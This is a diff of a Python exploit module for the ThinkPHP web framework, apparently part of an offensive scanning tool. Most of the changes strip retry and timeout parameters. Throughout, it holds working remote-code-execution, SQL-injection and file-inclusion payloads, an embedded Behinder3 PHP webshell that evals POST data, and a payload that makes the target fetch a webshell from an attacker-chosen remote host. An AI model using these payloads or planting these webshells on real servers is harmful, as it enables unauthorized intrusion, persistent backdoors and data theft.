@@ -21,15 +21,12 @@ class ThinkPHP():
         self.cmd = env.get('cmd')
         self.pocname = env.get('pocname')
         self.vuln = env.get('vuln')
-        self.timeout = env.get('timeout')
-        self.retry_time = env.get('retry_time')
-        self.retry_interval = env.get('retry_interval')
         self.flag = GlobalVar.get_value('flag')
         self.webshell = '''
         <?php
         @error_reporting(0);
         session_start();
-            $key="0c51f0ba4316a5c8";
+            $key="6eda972912ab956d";
             $_SESSION['k']=$key;
             session_write_close();
             $post=file_get_contents("php://input");
@@ -52,11 +49,12 @@ class ThinkPHP():
             class C{public function __invoke($p) {eval($p."");}}
             @call_user_func(new C(),$params);
         ?>'''
-        self.webshell_copy = '<?php copy("http://127.0.0.1/helloword.txt","helloword.php");?>'
+        self.webshell_copy = '<?php copy("http://{自定义webshell地址}/helloword.txt","helloword.php");?>'
         '''
-        assert -> <?php copy("http://127.0.0.1/helloword.txt", "helloword.php");?>
+        assert -> <?php copy("http://{自定义webshell地址}/helloword.txt", "helloword.php");?>
         file_put_contents -> vars[1][0]=helloword.php&vars[1][1]=helloword
         '''
+        
     #ThinkPHP3
     def tp3_select_find_delete_sql(self):
         appName = 'ThinkPHP'
@@ -69,16 +67,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"XPATH" in r.text:
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -95,17 +93,17 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                r = exprequest.get(self.url+path2, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
+                r = exprequest.get(self.url+path2, data=data, headers=headers)
                 if "f7e0b956540676a129760a3eae309294" in r.text:
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -121,17 +119,17 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"XPATH" in r.text:
                     
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -147,17 +145,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"cf67355a3333e6e143439161adc2d82" in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -169,22 +166,21 @@ class ThinkPHP():
         path = '/index.php?s=captcha'
         method = 'post'
         desc = '[rce]'
-        data = '_method=__construct&filter[]=var_dump&method=GET&server[REQUEST_METHOD]={}'.format(self.flag)
+        data = '_method=__construct&filter[]=var_dump&method=GET&server[REQUEST_METHOD]='+self.flag
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path, data=data, headers=headers)
                 if "string(5) \"{}\"".format(self.flag) in r.text:
-                    
-                    return output.no_echo_success(method, desc)
+                    return output.echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.post(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -195,22 +191,21 @@ class ThinkPHP():
         path = '/index.php?s=captcha'
         method = 'post'
         desc = '[rce]'
-        data = '_method=__construct&method=GET&filter[]=var_dump&get[]={}'.format(self.flag)
+        data = '_method=__construct&method=GET&filter[]=var_dump&get[]='+self.flag
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path, data=data, headers=headers)
                 if "string(5) \"{}\"".format(self.flag) in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.post(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -226,17 +221,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path, data=data, headers=headers)
                 if "string(5) \"{}\"".format(self.flag) in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.post(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -252,17 +246,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path, data=data, headers=headers)
                 if "string(5) \"{}\"".format(self.flag) in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.post(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -279,17 +272,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path, data=data, headers=headers)
                 if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.post(self.url+path, data=data_exec.format(self.cmd), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.post(self.url+path, data=data_exec.format(self.cmd), headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -305,17 +297,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path, data=data, headers=headers)
                 if "string(18) \"{}\"".format(self.flag) in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.post(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -334,21 +325,21 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.post(self.url+path, data=data_1.format('<?php phpinfo();?>'), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path, data=data_1.format('<?php phpinfo();?>'), headers=headers)
                 #include利用发包
-                r = exprequest.post(self.url+path, data=data_2.format(now_date[:6], now_date[6:]), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path, data=data_2.format(now_date[:6], now_date[6:]), headers=headers)
                 if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                exprequest.post(self.url+path, data=data_1.format(self.webshell_copy), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                exprequest.post(self.url+path, data=data_1.format(self.webshell_copy), headers=headers)
                 #include利用发包
-                exprequest.post(self.url+path, data=data_2.format(now_date[:6], now_date[6:]), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                r = exprequest.get(self.url+'/helloword.php', headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                exprequest.post(self.url+path, data=data_2.format(now_date[:6], now_date[6:]), headers=headers)
+                r = exprequest.get(self.url+'/helloword.php', headers=headers)
                 if r.status_code != 404:
                     print('[*]Behinder3连接地址: %s'%(self.url+'/helloword.php'))
                 else:
@@ -369,17 +360,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path, data=data, headers=headers)
                 if "string(5) \"{}\"".format(self.flag) in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.post(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -395,17 +385,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"cf67355a3333e6e143439161adc2d82" in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -421,17 +410,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"4f97319b308ed6bd3f0c195c176bbd77" in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -447,18 +435,17 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
                 path = r'/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=RECOMMAND'
-                result = exprequest.get(self.url+path.replace('RECOMMAND', self.cmd), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path.replace('RECOMMAND', self.cmd), data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -474,17 +461,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"56540676a129760a" in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -501,17 +487,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path_exec.format(quote(self.cmd)), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path_exec.format(quote(self.cmd)), data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -528,17 +513,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path, data=data, headers=headers)
                 if r"f7e0b956540676a129760a3eae309294" in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.post(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -554,17 +538,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"f7e0b956540676a129760a3eae309294" in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -582,24 +565,23 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
                 #windows 不区分大小写
-                exprequest.get(self.url+path1.replace('WEBSHELL','<?php var_dump(md5(2333));?>'), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                exprequest.get(self.url+path1.replace('WEBSHELL','<?php var_dump(md5(2333));?>'), data=data, headers=headers)
                 #linux 区分大小写
-                exprequest.get(self.url+path2.replace('WEBSHELL','<?php var_dump(md5(2333));?>'), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                r = exprequest.get(self.url+path3, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                exprequest.get(self.url+path2.replace('WEBSHELL','<?php var_dump(md5(2333));?>'), data=data, headers=headers)
+                r = exprequest.get(self.url+path3, data=data, headers=headers)
                 if r"56540676a129760a" in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
                 #Windows 不区分大小写
-                exprequest.get(self.url + path1.replace('WEBSHELL', quote(self.webshell)), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                exprequest.get(self.url + path1.replace('WEBSHELL', quote(self.webshell)), data=data, headers=headers).text
                 #Linux 区分大小写
-                exprequest.get(self.url + path2.replace('WEBSHELL', quote(self.webshell)), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                exprequest.get(self.url + path2.replace('WEBSHELL', quote(self.webshell)), data=data, headers=headers).text
                 print('[*]Behinder3连接地址 %s'%(self.url+path3))
         except Exception as error:
             return output.error_output(str(error))
@@ -616,17 +598,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"XPATH" in r.text:
-                    
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -642,17 +623,17 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"XPATH" in r.text:
                     
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -668,17 +649,17 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"XPATH" in r.text:
                     
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -694,17 +675,17 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"XPATH" in r.text:
                     
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -713,7 +694,6 @@ class ThinkPHP():
         appName = 'ThinkPHP'
         pocname = 'tp5_cache_include_file'
         method = 'post'
-        
         PHPSESSID = random_name(25)
         scriptname = random_name(6)+'.php'
         path1 = '/index.php?s=captcha'
@@ -733,22 +713,22 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.post(self.url+path1, data=post_param1.replace(r'{random}',payload), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                r = exprequest.post(self.url+path1, data=post_param2.replace(r'{random}',PHPSESSID), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                r = exprequest.get(self.url+'/'+path2, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path1, data=post_param1.replace(r'{random}',payload), headers=headers)
+                r = exprequest.post(self.url+path1, data=post_param2.replace(r'{random}',PHPSESSID), headers=headers)
+                r = exprequest.get(self.url+'/'+path2)
                 if self.flag in r.text:
-                    return output.no_echo_success(method, desc)
+                    return output.echo_success(method, desc)
                 else:
                     return output.fail()
             else:
                 vulntxt = self.webshell_copy
                 payload = "<?php+$a='file_put_contents';$b='base64_decode';$a($b('{}'),$b('{}'),FILE_APPEND);?>".format(base64.b64encode(scriptname.encode()).decode(),quote(base64.b64encode(vulntxt.encode()).decode(),'utf-8'))
-                r = exprequest.post(self.url+path1, data=post_param1.replace(r'{random}',payload), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                r = exprequest.post(self.url+path1, data=post_param2.replace(r'{random}',PHPSESSID), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                r = exprequest.get(self.url+'/'+path2, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path1, data=post_param1.replace(r'{random}',payload), headers=headers)
+                r = exprequest.post(self.url+path1, data=post_param2.replace(r'{random}',PHPSESSID), headers=headers)
+                r = exprequest.get(self.url+'/'+path2)
                 print(desc+' Behinder3 '+str(r.status_code)+' length='+str(len(r.text)))
         except Exception as error:
             return output.error_output(str(error))
@@ -765,16 +745,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.post(self.url+path, data=data, headers=headers)
                 if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.post(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -790,17 +770,17 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"56540676a129760a" in r.text:
                     
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -817,16 +797,16 @@ class ThinkPHP():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
             if self.vuln == 'False':
-                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
+                r = exprequest.get(self.url+path, data=data, headers=headers)
                 if r"56540676a129760a" in r.text:
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
             else:
-                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
+                result = exprequest.get(self.url+path, data=data, headers=headers).text
                 print(result)
         except Exception as error:
             return output.error_output(str(error))
@@ -997,51 +977,3 @@ def check(**kwargs):
                 thread_list.append(kwargs['pool'].submit(getattr(ExpThinkPHP, func)))
     #保存全局子线程列表
     GlobalVar.add_value('thread_list', thread_list)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
